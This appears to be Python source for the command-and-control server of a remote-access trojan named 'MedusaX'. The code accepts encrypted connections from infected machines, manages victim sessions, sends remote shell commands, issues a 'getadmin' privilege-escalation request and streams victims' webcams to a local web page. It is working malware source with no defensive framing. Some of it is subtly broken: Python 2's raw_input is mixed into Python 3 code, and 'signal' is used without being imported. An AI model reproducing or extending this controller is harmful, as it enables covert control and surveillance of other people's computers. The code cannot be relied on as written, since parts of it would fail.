import socket
import threading
import base64
import os
import select
import json
import hashlib
import sys
import cmd
from flask import Flask, Response
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import DSA
from Crypto.Random.random import randint
from collections import defaultdict

# Flask app
app = Flask(__name__)
webcam_stream_data = {}

# Diffie-Hellman Parameters
p = int("FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
        "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
        "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
        "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
        "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65381"
        "FFFFFFFFFFFFFFFF", 16)
g = 2

sessions = {}
session_id_counter = 0
active_session = None

# --- Encryption Functions ---
def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def aes_encrypt(data, aes_key):
    cipher = AES.new(aes_key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + ct_bytes

def aes_decrypt(enc, aes_key):
    iv = enc[:16]
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc[16:]), AES.block_size)

# --- Flask Route for Webcam Stream ---
@app.route("/webcam/<int:sid>")
def webcam_feed(sid):
    def generate():
        while True:
            if sid not in webcam_stream_data:
                break
            frame = webcam_stream_data[sid]
            yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

# --- Session Handler Thread ---
def handle_client(client_socket, addr, sid):
    global webcam_stream_data

    try:
        # DH Key Exchange
        a = randint(1, p - 2)
        A = pow(g, a, p)
        client_socket.send(str(A).encode() + b"\n")
        B = int(client_socket.recv(4096).decode().strip())
        shared_secret = pow(B, a, p)
        key = hashlib.sha256(str(shared_secret).encode()).digest()

        sessions[sid] = {
            'socket': client_socket,
            'addr': addr,
            'key': key,
            'background': False,
            'name': None,
        }

        # Initial client info
        client_socket.send(aes_encrypt(b'INFO', key))
        client_info = aes_decrypt(client_socket.recv(4096), key).decode()
        sessions[sid]['name'] = client_info

        while True:
            ready = select.select([client_socket], [], [], 0.1)
            if ready[0]:
                data = client_socket.recv(4096)
                if not data:
                    break
                decrypted = aes_decrypt(data, key)
                if decrypted.startswith(b'FRAME'):
                    frame = decrypted[5:]
                    webcam_stream_data[sid] = frame
                else:
                    print(decrypted.decode())
    except Exception as e:
        print(f"[!] Session {sid} ended: {e}")
    finally:
        client_socket.close()
        if sid in sessions:
            del sessions[sid]
            if sid in webcam_stream_data:
                del webcam_stream_data[sid]

# --- Command-line Interface ---
class MedusaXCLI(cmd.Cmd):
    prompt = 'medusax > '

    def do_sessions(self, args):
        """sessions [-i ID | -k ID | -K]"""
        global active_session
        if args.strip() == '':
            for sid, sess in sessions.items():
                print(f"[{sid}] {sess['name']} @ {sess['addr'][0]}")
        elif args.startswith('-i '):
            sid = int(args.split()[1])
            if sid in sessions:
                active_session = sid
                self.interact_with_session(sid)
        elif args.startswith('-k '):
            sid = int(args.split()[1])
            if sid in sessions:
                sessions[sid]['socket'].close()
                del sessions[sid]
        elif args.strip() == '-K':
            for sid in list(sessions):
                sessions[sid]['socket'].close()
                del sessions[sid]

    def do_background(self, args):
        """Background current session"""
        global active_session
        print("Session backgrounded.")
        active_session = None

    def do_shell(self, args):
        if active_session is None:
            print("[!] No active session.")
            return
        sess = sessions[active_session]
        while True:
            try:
                cmdline = raw_input(f"{sess['name']}@{sess['addr'][0]}> ")
                if cmdline.strip() == 'q':
                    break
                payload = aes_encrypt(cmdline.encode(), sess['key'])
                sess['socket'].send(payload)
            except:
                break

    def do_webcam_stream(self, args):
        if active_session is None:
            print("[!] No active session.")
            return
        print("[+] Webcam stream started. Press CTRL+Z to stop.")
        try:
            os.system(f"xdg-open http://127.0.0.1:5000/webcam/{active_session}")
            signal.pause()
        except KeyboardInterrupt:
            print("\nWebcam stream interrupted!")

    def do_getadmin(self, args):
        if active_session is None:
            print("[!] No active session.")
            return
        sess = sessions[active_session]
        sess['socket'].send(aes_encrypt(b'getadmin', sess['key']))

    def do_exit(self, args):
        print("Exiting...")
        os._exit(0)

# --- Main Listener ---
def start_listener(port=1337):
    global session_id_counter
    server = socket.socket()
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"[*] Listening on port {port}...")
    threading.Thread(target=app.run, kwargs={'debug': False}).start()
    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr}")
        sid = session_id_counter
        session_id_counter += 1
        threading.Thread(target=handle_client, args=(client, addr, sid)).start()

if __name__ == '__main__':
    threading.Thread(target=start_listener).start()
    MedusaXCLI().cmdloop()
